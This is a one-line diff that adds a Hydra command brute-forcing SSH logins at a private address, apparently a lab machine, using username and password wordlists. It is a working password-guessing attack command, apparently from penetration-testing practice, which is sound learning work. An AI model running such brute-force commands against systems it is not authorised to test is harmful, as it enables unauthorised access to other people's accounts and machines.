@@ -1,0 +1,1 @@
+hydra -V -f -t 20 -L name.txt -P pass.txt ssh://192.168.56.108
